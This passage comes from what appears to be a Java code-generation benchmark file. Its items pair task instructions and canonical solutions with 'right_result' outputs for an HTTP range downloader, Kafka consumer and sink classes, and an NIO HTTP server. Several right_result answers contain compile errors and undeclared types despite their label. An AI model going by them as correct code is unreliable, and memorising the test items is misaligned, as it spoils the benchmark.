entry.getValue().closed);\n        HttpDownloader cacheDownloader = downloaderMap.get(url);\n        if (cacheDownloader != null) {\n            cacheDownloader.close();\n        }\n        downloaderMap.put(url, this);\n\n        if(params.get(\"thread\") != null){\n            threadNum = Integer.parseInt(params.get(\"thread\"));\n        }\n        if(params.get(\"size\") != null){\n            blockSize = Integer.parseInt(params.get(\"size\"));\n        }\n        if(params.get(\"cookie\") != null){\n            cookie = params.get(\"cookie\");\n        }\n\n        Map<String, String> headers = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);\n        List<String> keys = Arrays.asList(\"referer\", \"icy-metadata\", \"range\", \"connection\", \"accept-encoding\", \"user-agent\", \"cookie\", \"authorization\");\n        for (String key : params.keySet()) if (keys.contains(key)) headers.put(key, params.get(key));\n        if(url.contains(\"\u5938\u514b\")) {\n            headers.put(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) quark-cloud-drive/2.5.20 Chrome/100.0.4896.160 Electron/18.3.5.4-b478491100 Safari/537.36 Channel/pckk_other_ch\");\n        }\n        String range = \"\";\n        if (params.get(\"range\") != null) {\n            range = params.get(\"range\");\n        }\n        this.getHeader(url, headers);\n        this.createDownloadTask(directUrl, headers);\n    }\n\n    private void createDownloadTask(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = requestBuilder.build();\n        \n        if(!this.supportRange || threadNum == 0) {\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, \"\", 0);\n            };\n            callableQueue.add(callable);\n            return;\n        }\n        \n        long start = 0; \n        long end = this.contentEnd;\n        String range = request.headers().get(\"Range\");\n        range = range == null ? \"0-\" : range;\n        range = range + \"-\" + this.contentEnd;\n        range = range.replace(\"--\", \"-\");\n        String pattern = \"bytes=(\\\\d+)-(\\\\d+)\";\n        Pattern r = Pattern.compile(pattern);\n        Matcher m = r.matcher(range);\n        if (m.find()) {\n            String startString = m.group(1); \n            String endString = m.group(2);\n            start = Long.parseLong(startString); \n            end = Long.parseLong(endString);\n        }\n\n        int sliceNum = 0;\n        while (start <= end) {\n            long curEnd = start + blockSize - 1;\n            curEnd = curEnd > end ? end : curEnd;\n            String ra = \"bytes=\" + start + \"-\" + curEnd;\n            final int _sliceNum = sliceNum;\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, ra, _sliceNum);\n            };\n            callableQueue.add(callable);\n            start = curEnd + 1;\n            sliceNum++;\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url,headers,range,sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        if(closed){\n            return null;\n        }\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        if (!range.isEmpty()) {\n            requestBuilder.removeHeader(\"Range\").addHeader(\"Range\", range);\n        }\n        if (cookie != null) {\n            requestBuilder.removeHeader(\"Cookie\").addHeader(\"Cookie\", cookie);\n        }\n        if (referer != null) {\n            requestBuilder.removeHeader(\"Referer\").addHeader(\"Referer\", referer);\n        }\n        Request request = requestBuilder.build();\n        int retryCount = 0;\n        int maxRetry = 5;\n        byte[] downloadbBuffer = new byte[1024*1024];\n        Response response = null;\n        Call call = null;\n        boolean directResp = false;\n        while (retryCount < maxRetry && !closed) {\n            try {\n                directResp = false;\n                call = downloadClient.newCall(request);\n                response = call.execute();\n                if (!response.isSuccessful()) {\n                    continue;\n                }\n                if (range.isEmpty()) {\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                if(sliceNum==0){\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                int bytesRead;\n                while (!closed && (bytesRead = response.body().byteStream().read(downloadbBuffer)) != -1) {\n                    baos.write(downloadbBuffer, 0, bytesRead);\n                }\n                return new ByteArrayInputStream(baos.toByteArray());\n            } catch (Exception e) {} finally {\n                if(response != null && !directResp){\n                    call.cancel();\n                    response.close();\n                }\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public synchronized int read(byte[] buffer, int off, int len) throws IOException {\n        try {\n            if (closed) {\n                return -1;\n            }\n            \n            if (this.is == null ) {\n                runTask(threadNum < 1 ? 1 : threadNum);\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n            }\n            int ol = this.is.read(buffer, off, len);\n            if ( ol == -1 ) {\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n                return this.is.read(buffer, off, len);\n            } \n            return ol;\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n    \n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"\u65b9\u6cd5\u672a\u5b9e\u73b0\uff0c\u4e0d\u80fd\u8c03\u7528\uff01\");\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed) {\n            return;\n        }\n        closed = true;\n        if(this.executorService != null) {\n            this.executorService.shutdownNow();\n        }\n        futureQueue.clear();\n        callableQueue.clear();\n    }\n\n    private void runTask(int num) {\n        while(num-- > 0 && callableQueue.size() > 0) {\n            Future<InputStream> future = this.executorService.submit(callableQueue.remove());\n            this.futureQueue.add(future);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import java.io.InputStream;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.Queue;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport okhttp3.Headers;\n\npublic class HttpDownloader extends InputStream {\n    private String contentType;\n    private long contentLength;\n    private long contentEnd;\n    private Headers header;\n    private int statusCode;\n    private String directUrl;\n    private volatile static int curConnId;\n    private volatile boolean closed;\n    private int connId;\n    private InputStream is;\n    private Queue<Callable<InputStream>> callableQueue;\n    private Queue<Future<InputStream>> futureQueue;\n    private static HashMap<String, HttpDownloader> downloaderMap;\n    private ExecutorService executorService;\n    private boolean supportRange;\n    private int blockSize;\n    private int threadNum;\n    private String cookie;\n    private String referer;\n    private int blockCounter;\n    private OkHttpClient downloadClient;\n    private OkHttpClient defaultClient;\n\n    public HttpDownloader(Map<String, String> params) {\n        this.blockSize = 10 * 1024 * 1024;\n        this.threadNum = 2;\n        this.cookie = params.getOrDefault(\"cookie\", \"\");\n        this.referer = params.getOrDefault(\"referer\", \"\");\n        this.downloadClient = new OkHttpClient();\n        this.defaultClient = new OkHttpClient();\n        this.downloaderMap = new ConcurrentHashMap<>();\n        this.executorService = Executors.newFixedThreadPool(threadNum);\n        this.supportRange = true;\n        this.callableQueue = new java.util.concurrent.LinkedBlockingQueue<>();\n        this.futureQueue = new java.util.concurrent.LinkedBlockingQueue<>();\n        this.curConnId = 0;\n        this.closed = false;\n        this.connId = ++curConnId;\n    }\n\n    public void createDownloadTask(String url, Map<String, String> headers) {\n        for (int i = 0; i < threadNum; i++) {\n            String range = \"bytes=\" + i * blockSize + \"-\" + (i + 1) * blockSize - 1;\n            callableQueue.add(() -> downloadTask(url, headers, range, i));\n        }\n    }\n\n    public InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        try {\n            Request request = new Request.Builder()\n                    .url(url)\n                    .header(\"Cookie\", cookie)\n                    .header(\"Referer\", referer)\n                    .header(\"Range\", range)\n                    .build();\n            Response response = downloadClient.newCall(request).execute();\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            ResponseBody body = response.body();\n            if (body == null) throw new IOException(\"No response body\");\n            return body.byteStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        try {\n            Request request = new Request.Builder()\n                    .url(url)\n                    .header(\"Cookie\", cookie)\n                    .header(\"Referer\", referer)\n                    .header(\"Range\", range)\n                    .build();\n            Response response = downloadClient.newCall(request).execute();\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            ResponseBody body = response.body();\n            if (body == null) throw new IOException(\"No response body\");\n            return body.byteStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    @Override\n    public int read(byte[] buffer, int off, int len) throws IOException {\n        if (closed) throw new IOException(\"Stream closed\");\n        if (is == null) {\n            is = _downloadTask(directUrl, null, \"bytes=0-\" + contentLength - 1, 0);\n        }\n        return is.read(buffer, off, len);\n    }\n\n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"Not implemented\");\n    }\n\n    public void close() {\n        if (closed) return;\n        closed = true;\n        if (is != null) {\n            try {\n                is.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (executorService != null) {\n            executorService.shutdownNow();\n        }\n    }\n\n    public void runTask(int num) {\n        for (int i = 0; i < num; i++) {\n            Future<InputStream> future = executorService.submit(callableQueue.poll());\n            futureQueue.add(future);\n        }\n    }\n}"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Kafka consumer class in Java that continuously polls messages from a specified Kafka topic and processes them asynchronously. The class should handle initialization and cleanup properly, and allow for graceful shutdown.\n\nClass Description: KafkaConsumeOrderWorkaround is a Spring component that implements a Kafka consumer worker thread. It consumes messages from a configured Kafka topic, commits offsets asynchronously, and can be gracefully stopped. The consumer runs in a separate thread to avoid blocking the main application.\n\nAttributes:\n- bootstrapServers: String - Kafka broker addresses injected from configuration\n- topicName: String - Kafka topic name to subscribe to, injected from configuration\n- consumerGroup: String - Consumer group ID (default: \"order\")\n- consumer: Consumer<Long, String> - Kafka consumer instance\n- pollingInterval: long - Polling interval in milliseconds (default: 250ms)\n- running: boolean - Flag to control the consumer thread's execution\n- consumerThread: Thread - The thread running the Kafka consumer\n\nMethods:\n- startConsuming() -> void - Initializes and starts the Kafka consumer thread. Configures consumer properties, creates consumer instance, subscribes to topic, and begins polling loop. Annotated with @PostConstruct to run after bean initialization.\n- stopConsuming() -> void - Signals the consumer thread to stop by setting running flag to false. Annotated with @PreDestroy to run before bean destruction.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Properties;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${spring.cloud.stream.kafka.binder.brokers}\")\n    private String bootstrapServers;\n\n    @Value(\"${spring.cloud.stream.bindings.input.destination}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        consumerThread = new Thread(\"kafka-workaround-consumer\") {\n            public void run() {\n                final Properties props = new Properties();\n                props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n                props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n                consumer = new KafkaConsumer<>(props);\n                consumer.subscribe(Collections.singletonList(topicName));\n                while (running) {\n                    consumer.poll(pollingInterval);\n                    consumer.commitAsync();\n                }\n                consumer.close();\n            }\n        };\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "right_result": "import org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.Serdes;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n    private String bootstrapServers;\n    private String topicName;\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = false;\n    private Thread consumerThread;\n\n    public void startConsuming() {\n        if (consumerThread != null && consumerThread.isAlive()) {\n            return;\n        }\n\n        consumer = new KafkaConsumer<>(getConsumerProperties());\n        consumer.subscribe(java.util.Collections.singletonList(topicName));\n        running = true;\n        consumerThread = new Thread(() -> {\n            while (running) {\n                try {\n                    java.util.Iterator<ConsumerRecord<Long, String>> iterator = consumer.poll(java.time.Duration.ofMillis(pollingInterval));\n                    while (iterator.hasNext()) {\n                        ConsumerRecord<Long, String> record = iterator.next();\n                        processMessage(record);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n            consumer.close();\n        });\n        consumerThread.start();\n    }\n\n    private java.util.Properties getConsumerProperties() {\n        java.util.Properties props = new java.util.Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, Serdes.Long().deserializer());\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, Serdes.String().deserializer());\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n        return props;\n    }\n\n    private void processMessage(ConsumerRecord<Long, String> record) {\n        // Process the message asynchronously\n        new Thread(() -> {\n            try {\n                // Simulate processing\n                Thread.sleep(100);\n                System.out.println(\"Processed message: \" + record.value());\n                consumer.commitSync();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void stopConsuming() {\n        running = false;\n        if (consumerThread != null) {\n            try {\n                consumerThread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Create a Kafka sink class that writes data to a Kafka topic, with configuration parameters for the Kafka producer and topic name.\n\nClass Description: The KafkaSink class is a self-documenting sink that takes data from an observable stream, encodes it, and writes it to a specified Kafka topic. It handles Kafka producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- encoder: [Func1<T, byte[]>] - Function to encode the input data into byte arrays\n- registry: [Registry] - Metrics registry for monitoring\n- kafkaProducerAtomicRef: [AtomicReference<KafkaProducer<byte[], byte[]>>] - Thread-safe reference to the Kafka producer instance\n- subscription: [Subscription] - Subscription to the observable data stream\n\nMethods:\n- call: [call(Context context, PortRequest ignore, Observable<T> dataO)] -> [void] - Initializes the Kafka producer if needed and subscribes to the input observable to send data to Kafka\n- getParameters: [getParameters()] -> [List<ParameterDefinition<?>>] - Returns the list of parameter definitions for Kafka configuration and topic name\n- metadata: [metadata()] -> [Metadata] - Provides metadata about the sink including name and description\n- close: [close()] -> [void] - Cleans up resources by unsubscribing from the observable stream",
    "Canonical_solution": "import com.netflix.spectator.api.Registry;\nimport io.mantisrx.runtime.Context;\nimport io.mantisrx.runtime.Metadata;\nimport io.mantisrx.runtime.PortRequest;\nimport io.mantisrx.runtime.parameter.ParameterDefinition;\nimport io.mantisrx.runtime.parameter.Parameters;\nimport io.mantisrx.runtime.parameter.type.StringParameter;\nimport io.mantisrx.runtime.parameter.validator.Validators;\nimport io.mantisrx.runtime.sink.SelfDocumentingSink;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> implements SelfDocumentingSink<T> {\n    private static final Logger logger = LoggerFactory.getLogger(KafkaSink.class);\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>(null);\n    private Subscription subscription;\n\n    KafkaSink(Registry registry, Func1<T, byte[]> encoder) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    @Override\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            MantisKafkaProducerConfig mantisKafkaProducerConfig = new MantisKafkaProducerConfig(context);\n            Map<String, Object> producerProperties = mantisKafkaProducerConfig.getProducerProperties();\n            KafkaProducer<byte[], byte[]> kafkaProducer = new KafkaProducer<>(producerProperties);\n            kafkaProducerAtomicRef.compareAndSet(null, kafkaProducer);\n            logger.info(\"Kafka Producer initialized\");\n        }\n        KafkaProducer<byte[], byte[]> kafkaProducer = kafkaProducerAtomicRef.get();\n        Parameters parameters = context.getParameters();\n        String topic = (String)parameters.get(KafkaSinkJobParameters.TOPIC);\n\n        subscription = dataO.map(encoder::call)\n            .flatMap((dataBytes) ->\n                         Observable.from(kafkaProducer.send(new ProducerRecord<>(topic, dataBytes)))\n                             .subscribeOn(Schedulers.io()))\n            .subscribe();\n    }\n\n    @Override\n    public List<ParameterDefinition<?>> getParameters() {\n        final List<ParameterDefinition<?>> params = new ArrayList<>();\n        params.add(new StringParameter()\n                       .name(KafkaSinkJobParameters.TOPIC)\n                       .description(\"Kafka topic to write to\")\n                       .validator(Validators.notNullOrEmpty())\n                       .required()\n                       .build());\n        params.addAll(MantisKafkaProducerConfig.getJobParameterDefinitions());\n        return params;\n    }\n\n    @Override\n    public Metadata metadata() {\n        StringBuilder description = new StringBuilder();\n        description.append(\"Writes the output of the job into the configured Kafka topic\");\n\n        return new Metadata.Builder()\n            .name(\"Mantis Kafka Sink\")\n            .description(description.toString())\n            .build();\n    }\n\n    @Override\n    public void close() {\n        subscription.unsubscribe();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport scala.Option;\nimport scala.collection.JavaConverters;\nimport scala.concurrent.duration.Duration;\nimport scala.util.Try;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> {\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>();\n    private Subscription subscription;\n\n    public KafkaSink(Func1<T, byte[]> encoder, Registry registry) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            Properties props = new Properties();\n            props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, context.getString(\"bootstrap.servers\"));\n            props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n            props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n            KafkaProducer<byte[], byte[]> producer = new KafkaProducer<>(props);\n            kafkaProducerAtomicRef.set(producer);\n        }\n\n        subscription = dataO\n                .observeOn(Schedulers.io())\n                .subscribe(data -> {\n                    byte[] messageBytes = encoder.call(data);\n                    KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n                    producer.send(new ProducerRecord<>(context.getString(\"topic.name\"), messageBytes));\n                });\n    }\n\n    public List<ParameterDefinition<?>> getParameters() {\n        List<ParameterDefinition<?>> parameters = new ArrayList<>();\n        parameters.add(new ParameterDefinition<>(\"bootstrap.servers\", String.class, \"localhost:9092\", \"Kafka bootstrap servers\"));\n        parameters.add(new ParameterDefinition<>(\"topic.name\", String.class, \"test-topic\", \"Kafka topic name\"));\n        return parameters;\n    }\n\n    public Metadata metadata() {\n        return new Metadata(\"Kafka Sink\", \"Sends data to a Kafka topic\");\n    }\n\n    public void close() {\n        if (subscription != null) {\n            subscription.unsubscribe();\n        }\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.getAndSet(null);\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles client connections asynchronously, processes incoming requests, and sends responses back to clients. The server should use non-blocking I/O operations managed by a Selector to efficiently handle multiple connections.\n\nClass Description: NioHttpServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) capabilities. It manages client connections, reads incoming requests, and writes responses asynchronously. The server can also make HTTP requests to external services (like Baidu in the example) to fetch response data.\n\nAttributes:\n- charset: [Charset] - The character set used for encoding/decoding text data (UTF-8 in this case)\n- client: [HttpClient] - Apache HttpClient instance used to make external HTTP requests\n\nMethods:\n- startServer: [startServer(int port)] -> [void] - Starts the HTTP server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop to handle client connections\n- handleAccept: [handleAccept(SelectionKey key, Selector selector)] -> [void] - Handles new client connections by accepting the SocketChannel and registering it with the selector for write operations\n- handleRead: [handleRead(SelectionKey key, Selector selector)] -> [void] - Handles incoming data from clients by reading from the SocketChannel and preparing for write operations\n- handleWrite: [handleWrite(SelectionKey key, Selector selector)] -> [void] - Handles writing data to clients by sending responses through the SocketChannel and preparing for read operations\n- executeResponse: [executeResponse()] -> [String] - Makes an HTTP GET request to an external service (Baidu in the example) and returns the response body as a string",
    "Canonical_solution": "import org.apache.commons.codec.Charsets;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.HttpStatus;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.HttpClientBuilder;\nimport org.apache.http.util.EntityUtils;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private static Charset charset = Charset.forName(\"UTF8\");\n    private HttpClient client = HttpClientBuilder.create().build();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        Selector selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            if (selector.select(1) > 0) {\n                Set<SelectionKey> set = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = set.iterator();\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key, selector);\n                    } else if (key.isReadable()) {\n                        handleRead(key, selector);\n                    } else if (key.isWritable()) {\n                        handleWrite(key, selector);\n                    }\n                    keyIterator.remove();\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n        selector.wakeup();\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String data = executeResponse().substring(0, 100);\n        byteBuffer.put(data.getBytes());\n        clientChannel.write(byteBuffer);\n        key.interestOps(SelectionKey.OP_READ);\n        selector.wakeup();\n    }\n\n    private String executeResponse() throws IOException {\n        String data = \"\";\n        HttpGet get = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(get);\n        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {\n            data = EntityUtils.toString(response.getEntity(), Charsets.UTF_8);\n        }\n        return data;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\n\npublic class NioHttpServer {\n    private final Charset charset = Charset.forName(\"UTF-8\");\n    private final CloseableHttpClient client = HttpClients.createDefault;\n    private Selector selector;\n    private ServerSocketChannel serverSocketChannel;\n\n    public void startServer(int port) throws IOException {\n        selector = Selector.open();\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        System.out.println(\"Server started on port \" + port);\n        while (true) {\n            int readyChannels = selector.select();\n            if (readyChannels == 0) continue;\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                keys.remove();\n                if (!key.isValid()) continue;\n                if (key.isAcceptable()) handleAccept(key, selector);\n                else if (key.isReadable()) handleRead(key, selector);\n                else if (key.isWritable()) handleWrite(key, selector);\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        ServerSocketChannel serverSocketChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverSocketChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n        System.out.println(\"Client connected\");\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n        buffer.flip();\n        String request = charset.decode(buffer).toString();\n        buffer.clear();\n        System.out.println(\"Received request: \" + request);\n        String response = executeResponse();\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n        key.attach(response);\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        String response = (String) key.attachment();\n        ByteBuffer buffer = ByteBuffer.wrap(response.getBytes(charset));\n        clientChannel.write(buffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n        key.attach(null);\n    }\n\n    private String executeResponse() {\n        try {\n            HttpGet request = new HttpGet(\"http://www.baidu.com\");\n            String response = client.execute(request, response -> {\n                StringBuilder sb = new StringBuilder();\n                for (int ch; (ch = response.read()) != -1;) {\n                    sb.append((char) ch);\n                }\n                return sb.toString();\n            });\n            return response;\n        } catch (Exception e) {\n            return \"Error fetching data\";\n        }\n    }\n}"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
